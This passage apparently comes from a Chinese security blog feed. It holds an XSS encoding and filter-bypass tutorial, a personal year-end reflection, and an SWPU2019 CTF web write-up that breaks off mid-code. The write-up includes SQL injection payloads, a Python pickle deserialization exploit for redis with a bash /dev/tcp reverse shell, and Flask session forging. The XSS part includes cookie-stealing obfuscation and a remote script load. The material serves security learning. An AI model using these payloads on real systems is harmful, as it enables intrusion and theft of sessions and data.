href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>第一步解码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</span><br></pre></td></tr></table></figure><p>URL解码器可试别，交给URL解码器处理，第二步解码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:\u0061\u006c\u0065\u0072\u0074(15)</span><br></pre></td></tr></table></figure><p>最后由js解码器解码，然后执行js</p><p>从上面的例子我们可以看出几个关键点：</p><p>1.js解码器只会对字符串和标识符进行js解码</p><p>2.RCDATA元素(textarea)，可以容纳实体引用，也就是可以进行HTML解码操作，但其实子元素是无法执行的</p><p>3.URL解码需要进行协议识别后才能进行解码</p><p>4.原始文本元素中无法进行URL解码和HTML解码</p><h4 id="实战例子"><a href="#实战例子" class="headerlink" title="实战例子"></a>实战例子</h4><h5 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h5><p>这个例子选取了Wooyun中的一个例子</p><p>漏洞点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:location&#x3D;&#39;.&#x2F;3.3.php?offset&#x3D;&#39;+document.getElementById(&#39;pagenum&#39;).value+&#39;&amp;searchtype_yjbg&#x3D;yjjg&amp;searchvalue_yjbg&#x3D;&#39;&quot;&gt;GO&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>我们输入的searchvalue_yjbg参数会随着这个a标签一起插入到页面源码中</p><p>首先页面是对单引号进行了过滤，我们无法执行输入单引号去进行闭合，但是我们可以输入进行HTML编码后的单引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wooyun%26%23x27,alert(1)%2b%26%23x27</span><br></pre></td></tr></table></figure><p>解析过程为：首先进行HTML解码，将这些HTML编码解析为对应的字符串，此时他并不会进行闭合，只有在执行js代码的时候，js引擎将这些字符串再一遍解析，而这个之前被当作字符串的单引号就起到了闭合的作用，最终执行了我们的自定义的js代码，像这样的例子还有一些，我们接着来举一些。</p><h5 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src &#x3D; &quot;https:&#x2F;&#x2F;text.com&quot; onclick &#x3D; &#39;alert(&quot;输入点&quot;)&#39;&gt;</span><br></pre></td></tr></table></figure><p>在过滤掉单引号的情况下我们可以通过实体编码的方式进行Bypass，解析的流程也和之前的一样，先进行HTML解码将我们的闭合双引号解析为字符串，再在js引擎处理这段js代码的过程中产生闭合注入</p><h5 id="例三"><a href="#例三" class="headerlink" title="例三"></a>例三</h5><p>这个是先知文章中的一个例子，感觉蛮经典的，拿来引用一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onclick&#x3D;&quot;window.open(&#39;value1&#39;)&quot; href&#x3D;&quot;javascript:window.open(value2)&quot;&gt;</span><br></pre></td></tr></table></figure><p>对于value1: 先进行HTML解码，由于onclick再进行js解码，最后由于window.open函数进行URL解码。</p><p>对于value2，先HTML解码，由于href属性进行一次URL解码，由于javascript协议，进行js解码，最后由于window.open再URL解码，所以在这个例子中一共进行了两次URL解码。</p><h4 id="新增的HTML5实体编码带来的安全问题"><a href="#新增的HTML5实体编码带来的安全问题" class="headerlink" title="新增的HTML5实体编码带来的安全问题"></a>新增的HTML5实体编码带来的安全问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;colon; 冒号</span><br><span class="line">&amp;NewLine; 换行</span><br></pre></td></tr></table></figure><p>Bypass Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>HTML解码后，即可执行</p><h4 id="浏览器的词法分析器"><a href="#浏览器的词法分析器" class="headerlink" title="浏览器的词法分析器"></a>浏览器的词法分析器</h4><p>对于下面JS的执行成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javasc</span><br><span class="line">ript:alert(1)&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>浏览器中的解析器中词法分析器起的作用会跳过空白跟换行之类的无效字符</p><p>onerror=的换行Bypass也是利用了这个词法分析器进行实现的</p><h3 id="XSS的一些技巧"><a href="#XSS的一些技巧" class="headerlink" title="XSS的一些技巧"></a>XSS的一些技巧</h3><p>通过top,windows对象来Bypass某些关键词</p><p>详细的看这篇文章好了</p><p><a href="https://www.anquanke.com/post/id/176185" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176185</a></p><h3 id="JavaScript全局变量绕过XSS过滤器"><a href="#JavaScript全局变量绕过XSS过滤器" class="headerlink" title="JavaScript全局变量绕过XSS过滤器"></a>JavaScript全局变量绕过XSS过滤器</h3><p>举几个例子就可以懂了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alert(document.cookie)&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">self[&quot;\x61\x6c\x65\x72\x74&quot;](</span><br><span class="line">    self[&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74&quot;]</span><br><span class="line">        [&quot;\x63\x6f\x6f\x6b\x69\x65&quot;]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里的self可以被如下代替：</p><p>• window</p><p>• self</p><p>• _self</p><p>• this</p><p>• top</p><p>• parent</p><p>• frames</p><h4 id="jQuery的变异"><a href="#jQuery的变异" class="headerlink" title="jQuery的变异"></a>jQuery的变异</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">self[&quot;$&quot;][&quot;globalEval&quot;](&quot;alert(1)&quot;);</span><br><span class="line">&#x2F;&#x2F;这里我也可以变异的很复杂</span><br><span class="line">self[&quot;$&quot;][&quot;getScript&quot;](&quot;Your_vps&quot;);</span><br><span class="line">&#x2F;&#x2F;加载远程脚本</span><br></pre></td></tr></table></figure><h4 id="Object迭代"><a href="#Object迭代" class="headerlink" title="Object迭代"></a>Object迭代</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; Object.keys(self)[145]</span><br><span class="line">&lt; &quot;alert&quot;</span><br><span class="line">&gt; self[Object.keys(self)[145]](&quot;foo&quot;) &#x2F;&#x2F; alert(&quot;foo&quot;)</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/1bsdcF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/12/1bsdcF.png" alt="1bsdcF.png"></a></p><p>首先通过迭代遍历出alert或者其他想要获得函数的位置</p><p>在平时我们在或者cookie的时候，一般用的是document.cooie，通过全局变量的bypass我们可以大大将或者cookie的语句复杂化进而Bypass掉某些规则</p><p>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self[Object.keys(self)[9]][&quot;\x63\x6f\x6f\x6b\x69\x65&quot;]</span><br></pre></td></tr></table></figure><p>我再弄的复杂点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self[Object.keys(self)[9]][self[Object.keys(self)[171]](&#39;Y29va2ll&#39;)]</span><br></pre></td></tr></table></figure><p>这个索引号同样也可以复杂化</p><p>定义一个a函数，这个a函数代表的就是查找索引号的结果，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;()&#x3D;&gt;&#123;c&#x3D;0;for(i in self)&#123;if(&#x2F;^a[rel]+t$&#x2F;.test(i))&#123;return c&#125;c++&#125;&#125; &#x2F;&#x2F;找到索引</span><br><span class="line"></span><br><span class="line">self[Object.keys(self)[a()]](&quot;1&quot;)</span><br><span class="line">&#x2F;&#x2F;弹窗</span><br></pre></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://xz.aliyun.com/t/5863" target="_blank" rel="noopener">https://xz.aliyun.com/t/5863</a></p><p><a href="https://xz.aliyun.com/t/5950#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/5950#toc-13</a></p><p><a href="http://drops.xmd5.com/static/drops/tips-689.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-689.html</a></p><p><a href="https://blog.zeddyu.info/2019/03/13/Web安全从零开始-XSS-I/#Encode" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-I/#Encode</a></p><p><a href="https://www.anquanke.com/post/id/176185#h3-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176185#h3-7</a></p><p><a href="https://zhuanlan.zhihu.com/p/75785844" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/75785844</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在家瘫了很多天了（夹杂着一些个人感情问题&lt;/p&gt;
&lt;p&gt;花了很多时间，虽然没有学习，但是理清了一些东西吧，也算是另一种收获了。&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>对于2019年的思考与总结</title>
    <link href="http://yoursite.com/2020/01/12/%E5%AF%B9%E4%BA%8E2019%E5%B9%B4%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/01/12/%E5%AF%B9%E4%BA%8E2019%E5%B9%B4%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E6%80%BB%E7%BB%93/</id>
    <published>2020-01-12T12:11:56.000Z</published>
    <updated>2020-01-12T12:15:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>转眼间2019已经过去了，伴随着人们对新的一年的美好期望，2020开始了，这里也想对自己的2019进行一个全面一些的复盘，按以下几个方面</p><ul><li>我今年做了什么</li><li>我明年希望做什么</li><li>有哪些东西我本可以在今年做的更好</li><li>今年踩过的坑有什么教训</li><li>明年想要学习和精进的东西</li></ul><p>以第三人称的视角来看一下自己今年的经历，也能更理性的分析一下需要改进的地方了。</p><h3 id="我今年做了什么"><a href="#我今年做了什么" class="headerlink" title="我今年做了什么"></a>我今年做了什么</h3><h4 id="比赛-学习方面"><a href="#比赛-学习方面" class="headerlink" title="比赛/学习方面"></a>比赛/学习方面</h4><p>今年打了蛮多比赛的，学到了很多知识，很多高质量比赛让我受益匪浅，也认识了很多志趣相投的伙伴师傅们，在此也特别感谢师傅们对我的帮助，在不断学习的过程中更加明确了自己的方向与学习体系，希望有一天可以成长到我心中期望的高度。</p><p>同时今年也通过比赛去了很多地方，比如：成都，苏州，上海，广州，体会了各个城市的一些人文特色与风味小吃(成都真的很棒)，下面的图片就是成都的锦里：</p><p><a href="https://imgchr.com/i/lRFFB9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/08/lRFFB9.md.jpg" alt="lRFFB9.md.jpg"></a></p><p><a href="https://imgchr.com/i/lRFT4x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/08/lRFT4x.md.png" alt="lRFT4x.md.png"></a></p><p>这是今年巅峰极客决赛后去锦里拍的，算是满足我的一个心愿吧（去歌名中的地方听着这首歌）</p><h4 id="书籍阅读方面："><a href="#书籍阅读方面：" class="headerlink" title="书籍阅读方面："></a>书籍阅读方面：</h4><p>在2019年里对于非技术类书籍主要看的还是以小说为主，最多的是东野圭吾的作品，也看了几部余华的作品，偶尔也会看一些投资理财类的书籍，不过投资理财类书籍的时间投入相比于小说类的时间还是少了蛮多时间，对于经济类的这方面知识更多的是在B站up主巫师财经中了解到的，而非纸质类的阅读。这一年大概阅读完的书籍：</p><ul><li>《恶意》</li><li>《无人生还》</li><li>《嫌疑人X的献身》</li><li>《白夜行》</li><li>《人生》</li><li>《虚无的十字架》</li><li>《投资中最简单的事情》</li></ul><h4 id="健康方面："><a href="#健康方面：" class="headerlink" title="健康方面："></a>健康方面：</h4><p>坚持了一段时间的夜跑，感觉身体素质好了一些，其他的健身方面就很少了，这也是我今年身体素质不太好的原因之一。</p><h4 id="生活方面："><a href="#生活方面：" class="headerlink" title="生活方面："></a>生活方面：</h4><p>生活方面应该是今年踩坑最多的地方了，我觉得这个放在下面单独来谈一下会更好一些。</p><h3 id="我明年希望做什么"><a href="#我明年希望做什么" class="headerlink" title="我明年希望做什么"></a>我明年希望做什么</h3><h4 id="比赛-学习方面-1"><a href="#比赛-学习方面-1" class="headerlink" title="比赛/学习方面"></a>比赛/学习方面</h4><p>这方面也是2020年最主要的方面，还是需要去不断的去加厚技术栈，进行思考并且实践，在新的一年里多接触一下实战，多挖一下SRC，希望可以发一些高质量的文章，冲击一下更高质量的比赛！还有就是英语方面多练习一下口语和听力，时间应该是用来做有意义的事情，浪费在毫无意义的地方上真的蛮惭愧的，这句话对2019的我来说很合适。</p><h4 id="生活方面：-1"><a href="#生活方面：-1" class="headerlink" title="生活方面："></a><strong>生活方面：</strong></h4><p>在生活方面像改进的地方还是蛮多的，具体方面如下</p><p>​    <strong>专注度：</strong>最重要的还是想提高自己的专注度，感觉之前学习的专注度并不是很高，可能坐在自习室两个小时，真正有效的学习时间只有半个小时，而那一个半小时可能都在玩，比如刷刷B站，刷刷知乎，这样低的时间利用率造成达到更多的是时间浪费后的悔恨感。</p><p>​    <strong>态度：</strong>在对待生活感觉需要更多的是理性思维，而过去的自己在思考面对一些问题的时候更多是感性思维占据上风，现在的想法就是逐步把感性思维转换为理性思维。</p><h4 id="摄影方面："><a href="#摄影方面：" class="headerlink" title="摄影方面："></a>摄影方面：</h4><p>大概是从2019的年末开始对摄影开始感兴趣，不过想先入坑一下运动相机，比如Insta360 one R或者Go pro之类的，在精力和时间允许的情况下，可以把自己平时拍到的有趣的东西以及自己的生活分享到bilibili上，做个有趣的up主！去更多的城市旅游，拍下更多有趣的风景！</p><h4 id="健康方面：-1"><a href="#健康方面：-1" class="headerlink" title="健康方面："></a>健康方面：</h4><p>2019糟糕的身体情况还是给我了很大的警戒的，在2020要继续坚持下跑步，开始进行长跑的训练，希望今年可以有机会参加一下马拉松（半马)，并且开始更全面与科学的健身计划。</p><h4 id="书籍阅读方面：-1"><a href="#书籍阅读方面：-1" class="headerlink" title="书籍阅读方面："></a>书籍阅读方面：</h4><p>技术类的书籍还是更喜欢看一些电子版或者是文章，纸质化的非技术类书籍在2019年的阅读以小说为主，理财经济类为辅，在2020年希望可以再多阅读几本东野圭吾的书吧，同时增加经济理财类书籍的阅读量。</p><p>2020年我的部分阅读目标：</p><ul><li>《思考的快与慢》</li><li>《曾国藩的正面与侧面》</li><li>《放学后》</li><li>《新参者》</li><li>《岛上书店》</li><li>《我可以咬一口吗》</li></ul><h3 id="有哪些东西我本可以在今年做的更好"><a href="#有哪些东西我本可以在今年做的更好" class="headerlink" title="有哪些东西我本可以在今年做的更好"></a>有哪些东西我本可以在今年做的更好</h3><h4 id="比赛-学习："><a href="#比赛-学习：" class="headerlink" title="比赛/学习："></a>比赛/学习：</h4><ul><li>提高做事情的专注度，在2019年我做事情的专注度可以说是很差了</li><li>增加上课时间的利用率，2019几乎是从未听过一节课，上课的时间都放在了刷知乎了，所以2020我觉得充分利用上课的时间可以给我带来很大的益处。</li><li>打一些高质量的比赛，少打垃圾比赛</li></ul><h4 id="生活方面：-2"><a href="#生活方面：-2" class="headerlink" title="生活方面："></a>生活方面：</h4><p>感觉在2019年我的整个生活态度是比较丧的吧，我应该是积极调整心态，去冷观生活的，正如她所说：生活是滚烫的，而人的生活应该是热烈的。</p><h4 id="健康方面：-2"><a href="#健康方面：-2" class="headerlink" title="健康方面："></a>健康方面：</h4><p>每天一定要抽出一些时间来锻炼身体的，跑步还是对一整天的劳累有很大的缓解作用的。</p><h4 id="书籍阅读方面：-2"><a href="#书籍阅读方面：-2" class="headerlink" title="书籍阅读方面："></a>书籍阅读方面：</h4><p>可能是最后两个月的个人感情导致的问题吧，读书也不太专心，导致后面两个月的读书进度很慢，可以说是后两个月几乎什么都没做了，复习的时候也是状态很差的，我本可以在这两个月做的更好，不过人生的每段经历都有其各自的对应意义吧，都可以让人更快的成长起来。</p><h3 id="今年踩过的坑-有什么教训"><a href="#今年踩过的坑-有什么教训" class="headerlink" title="今年踩过的坑 有什么教训"></a>今年踩过的坑 有什么教训</h3><p>今年踩的坑主要是生活方面，更具体来说应该是感情方面，对我来说这个坑不是今年的坑，已经很多年了，只不过今年又踩了一次罢了。</p><p>“你所拥有的只是单纯真挚的喜欢”</p><p>每一段经历似乎都像是人生路途的一段风景，而究竟你是被我抹去那段风景，还是我是被你抹去的那段风景似乎也没那么重要，毕竟都已不在了…</p><p><a href="https://imgchr.com/i/lTk9qx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/12/lTk9qx.md.png" alt="lTk9qx.md.png"></a></p><p>更多的困扰应该是由执念无法放下而产生的</p><p>说到底之所以无法放下还是因为个人拥有的太少了，而戏确太多了，回顾一下过去的几段经历，确实，我活的像个戏精一样，其实在对方那里”戏精”的地位根本不重要，一切都是自我幻想而已，我给自己加了很多戏码，同时也沉迷于我自己给自己安排的这些戏里，无法自拔，就像是我给自己进行深度催眠了好久一样。</p><p>看过一段话蛮有道理</p><blockquote><p>“其实一切都是你的幻想，你在别人那里根本不重要，一切的情深状态，都是你自己安排给自己的戏而已，你在自己幻想的戏份中，演得津津有味，殊不知这些时间，对方已经成长多少，做了多少对他自己有益的事，只有你在这里当个戏精”</p></blockquote><p>想想之前的自己何尝不是陷入这样的状态，为了这些不值得的人或事物，浪费自己宝贵的成长时间。</p><h3 id="明年想要学习与精进的东西"><a href="#明年想要学习与精进的东西" class="headerlink" title="明年想要学习与精进的东西"></a>明年想要学习与精进的东西</h3><h4 id="精进"><a href="#精进" class="headerlink" title="精进"></a>精进</h4><ul><li>加厚技术栈，不断学习思考，精进面对事物理性思考的能力，最大化限制感性的地方</li><li>多写代码，多审计代码</li></ul><h4 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h4><ul><li>提高实战渗透能力</li><li>学习摄影以及各类剪辑软件的使用</li><li>FPV穿越机的入门</li></ul><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>愿2020年理性且热烈！加油！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;转眼间2019已经过去了，伴随着人们对新的一年的美好期望，2020开始了，这里也想对自己的2019进行一个全面一些的复盘，按以下几个方面&lt;/
      
    
    </summary>
    
    
    
      <category term="生活随笔" scheme="http://yoursite.com/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019-Web题解</title>
    <link href="http://yoursite.com/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/</id>
    <published>2019-12-11T11:52:10.000Z</published>
    <updated>2019-12-11T11:53:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>题目蛮不错的，学到了一些有意思的地方</p><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>开始的时候没放不是xss的提示..就有点坑，当xss做了很久..</p><p>广告标题处存在注入，测试 1’xa,点击广告详情，发现报错，确认注入点</p><p>过滤了空格，用/**/代替就好了，因为这个是有回显的，所以直接用union select就行…(22字段是真的狠..，这里代替union select去测字段除了order by 还有group by ,payload为 group by 22,’1,在确认字段数为22后，开始注入，因为过滤了or，所以无法通过information….这样的payload拿到表名，不过可以想起想到时间看到的bypass information_schema，又看了下数据库的版本是八点多的，满足条件，用sys.schema_auto_increment_columns bypass下payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1&#39;</span><br></pre></td></tr></table></figure><p>拿到两个表名，一个是广告表名，一个是用户表，想着注入试试admin的密码</p><p>然后就是一个常规的无列名注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;c&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x&#x2F;**&#x2F;limit&#x2F;**&#x2F;1,1),3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1&#39;</span><br></pre></td></tr></table></figure><p>拿到了一个md5值，去somd5解了一下，拿到flag</p><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>登陆进去提示redis，github找了一个弱密码测试脚本，发现密码是password，当时想两个思路，一个是通过redis主从复制去RCE，第二个是结合登陆去python 反序列化RCE</p><p>redis的主从复制rce受到的限制蛮大的，config等关键命令都被过滤了，目前应该也没有这种过滤关键命令的Bypass 方法，所以还是考虑用Python反序列化去rce</p><p>这里py2和py3的数据还是有一些差异的，当时没太细看，直接py3打redis了，后来发现这是py2</p><p><a href="https://imgse.com/i/QBQrkj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QBQrkj.md.png" alt="QBQrkj.md.png"></a></p><p>从上图看下对比.</p><p>二者生成的区别还是蛮大的，而这道题去get session看一下，明显是python2生成的，所以用py2打就可以了</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">s = <span class="string">"bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1"</span></span><br><span class="line"><span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">r = redis.Redis(host=<span class="string">'114.67.109.247'</span>,password=<span class="string">"password"</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line">r.set(<span class="string">"session:your_session"</span>, s)</span><br></pre></td></tr></table></figure><p>打之后刷新一下，vps上监听一下，获得反弹过来的shell</p><h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>随便用户名和密码上去之后，发现有个upload功能，不过没有权限，怀疑可能是伪造用户这样,而且还看到了jwt，不过开始一直没看到secret key</p><p>login界面的源码是有提示404 not found的…，随便访问一个不存在的路由，拿到secret key为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure><p>之后就开始伪造jwt了，首先解密下目前的jwt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py decode -c <span class="string">"eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTExMSIsInVzZXJuYW1lIjoiMTExMTEifQ.Xe9dTA.0muECEr4tz5rfatCoCkOpbMqxns"</span> -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">u'username'</span>: <span class="string">u'11111'</span>, <span class="string">u'password'</span>: <span class="string">u'1111'</span>, <span class="string">u'id'</span>: <span class="string">'100'</span>, <span class="string">u'is_login'</span>: <span class="literal">True</span>&#125;</span><br></pre></td></tr></table></figure><p>一般在开发中第一个用户都是admin，尝试将id改为1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py encode -t <span class="string">"&#123;u'username': u'11111', u'password': u'1111', u'id': '1', u'is_login': True&#125;"</span> -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span></span><br><span class="line"></span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTExMSIsInVzZXJuYW1lIjoiMTExMTEifQ.Xe9eCA<span class="number">.7</span>pipbqFINq5xl2Qhu0jl_IO0ynM</span><br></pre></td></tr></table></figure><p>改下jwt刷新一下就可以上传了，并且拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 